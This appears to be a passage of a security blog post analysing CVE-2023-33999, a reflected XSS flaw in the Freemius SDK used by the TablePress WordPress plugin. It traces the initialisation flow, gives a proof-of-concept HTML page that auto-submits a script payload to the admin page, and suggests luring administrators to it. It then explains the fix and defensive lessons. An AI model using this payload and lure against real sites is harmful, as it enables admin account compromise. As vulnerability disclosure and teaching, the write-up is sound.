<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">tablepress/tablepress.php</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Init Freemius.
</span></span></span><span class="line"><span class="cl"><span class="nx">tb_tp_fs</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Because <code>tablepress.php</code> is the first file loaded by WordPress when the plugin runs, the Freemius SDK is also initialized from here.</p>
<p>Therefore, the flow <code>tablepress/tablepress.php</code> → <code>tb_tp_fs()</code> → <code>fs_dynamic_init()</code> → <code>dynamic_init()</code> is always executed whenever WordPress processes a request and the TablePress plugin is loaded. This means that the logic inside <code>dynamic_init()</code>, including reading data from the request (such as <code>purchased_plan</code>, <code>purchase_email…</code>), will always have a chance to be triggered when users access endpoints related to the admin area.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-12-05-cve-2023-33999/trigger.png" title="Triggering the vulnerability" data-thumbnail="/posts/2025-12-05-cve-2023-33999/trigger.png" data-sub-html="<h2>Trigger</h2><p>Triggering the vulnerability</p>"><img loading="lazy" src='/posts/2025-12-05-cve-2023-33999/trigger.png' alt="Trigger" height="1056" width="1919"></a><figcaption class="image-caption">Triggering the vulnerability</figcaption>
  </figure></p>
<p>However, in order for the vulnerability to be exploited with unauthenticated privileges, the attacker cannot directly interact with it but must build an indirect scenario, such as luring an administrator to visit a malicious website. In that case, the admin’s browser may automatically send a request to the logged-in WordPress admin page, carrying parameters controlled by the attacker, thereby triggering unintended behavior during the plugin’s processing.</p>
<h2 class="heading-element" id="poc"><span>PoC</span>
  <a href="#poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Create a malicious website that automatically sends a request to the WordPress admin page:</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true" data-open="true"><div class="chroma">
<div class="code-header language-html"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://localhost/wp-admin/index.php&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;purchase&amp;#95;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&amp;lt;svg&amp;#47;onload&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ol start="2">
<li>Send the link of this website to a user with administrator privileges and trick them into visiting it, thereby triggering the request when the malicious page is loaded.</li>
</ol>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>CVE-2023-33999 originates from <strong>unsanitized input handling</strong> in <code>fs_request_get()</code> of the Freemius SDK, allowing user-controlled data to be directly injected into content displayed in the admin page. Because Freemius is widely embedded in many plugins and themes, the impact of this vulnerability is much greater than that of a single plugin. Version 2.5.10 fixes the issue by <strong>separating data retrieval and sanitization</strong>, ensuring that all data from requests is sanitized before being used.</p>
<h2 class="heading-element" id="key-takeaways"><span>Key Takeaways</span>
  <a href="#key-takeaways" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Never trust data from <code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code> – always <strong>sanitize and escape</strong> before using or displaying it.</li>
<li>A vulnerability in a shared SDK (such as Freemius) creates a <strong>chain reaction</strong> affecting thousands of products.</li>
<li>Always check third-party libraries and <strong>update to patched versions in a timely manner</strong>.</li>
<li>Early SDK initialization increases the chance that a vulnerability can be triggered on more requests than expected.</li>
<li>Reflected XSS can be exploited indirectly through <strong>social engineering</strong> and malicious websites.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html" target="_blank" rel="external nofollow noopener noreferrer">Cross Site Scripting</a></p>
<p><a href="https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Related Content</h2>
    <ul><li>
          <a href="/posts/2025-12-06-cve-2024-11600/" title="CVE-2024-11600 Analysis &amp; POC">CVE-2024-11600 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-12-05-cve-2025-48140/" title="CVE-2024-8672 Analysis &amp; POC">CVE-2024-8672 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-12-04-cve-2024-8672/" title="CVE-2024-8672 Analysis &amp; PoC">CVE-2024-8672 Analysis &amp; PoC</a></li><li>
          <a href="/posts/2025-12-03-cve-2025-30911/" title="CVE-2025-30911 Analysis &amp; POC">CVE-2025-30911 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-12-02-cve-2025-52756/" title="CVE-2025-52756 Analysis &amp; POC">CVE-2025-52756 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-12-01-cve-2025-3053/" title="CVE-2025-3053 Analysis &amp; POC">CVE-2025-3053 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-30-cve-2025-32222/" title="CVE-2025-32222 Analysis &amp; POC">CVE-2025-32222 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-28-cve-2025-9321/" title="CVE-2025-9321 Analysis &amp; POC">CVE-2025-9321 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li>
          <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Updated on 2025-12-05 15:17:41">Updated on 2025-12-05&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/412b5b5e389efff876abe612fdc837966d340b7d" rel="external nofollow noopener noreferrer" target="_blank" title="Add post 2025-12-05-CVE-2023-33999&#10&#10Commit: 412b5b5e389efff876abe612fdc837966d340b7d [412b5b5e]&#10Author: w41bu1&#10Date: 2025-12-05 15:17:41"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>412b5b5e</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/2025-12-05-cve-2023-33999/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-12-05-CVE-2023-33999/index.en.md?plain=1" title="View source" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">View source</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts/2025-12-05-CVE-2023-33999/index.en.md" title="Edit this page" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Edit this page</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2023-33999&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2023-33999&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/posts/2025-12-05-cve-2023-33999/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts/2025-12-05-CVE-2023-33999/index.en.md?plain=1%7c" title="Report issue" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Report issue</a></span><span><a href="vscode://file//home/w41/Project/w41bu1.github.io/content/posts/2025-12-05-CVE-2023-33999/index.en.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2025-12-05-cve-2023-33999/" data-title="CVE-2023-33999 Analysis &amp; POC" data-hashtags="analyst,plugin,xss"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2025-12-05-cve-2023-33999/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/2025-12-05-cve-2023-33999/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/2025-12-05-cve-2023-33999/" data-title="CVE-2023-33999 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/analyst/" class="post-tag" title="Tags - Analyst">Analyst</a><a href="/tags/plugin/" class="post-tag" title="Tags - Plugin">Plugin</a><a href="/tags/xss/" class="post-tag" title="Tags - Xss">Xss</a></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/2025-12-05-cve-2025-48140/" class="post-nav-item" rel="prev" title="CVE-2024-8672 Analysis &amp; POC"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2024-8672 Analysis &amp; POC</a><a href="/posts/2025-12-06-cve-2024-11600/" class="post-nav-item" rel="next" title="CVE-2024-11600 Analysis &amp; POC">CVE-2024-11600 Analysis &amp; POC<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#about-freemius-sdk">About Freemius SDK</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#poc">PoC</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="github.com/w41bu1">Bui Van Y</a></span><span class="license footer-divider">w41bu1</span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div><div class="footer-line beian"><span class="gov"><i class="fa-solid fa-user-secret"></i></span><span class="icp footer-divider"><i class="fa-solid fa-bug"></i></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script src="/js/config/87e1e82cb5e9b8d1b966d79fba7e34af.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/flyfish.min.js" defer></script></body>
</html>
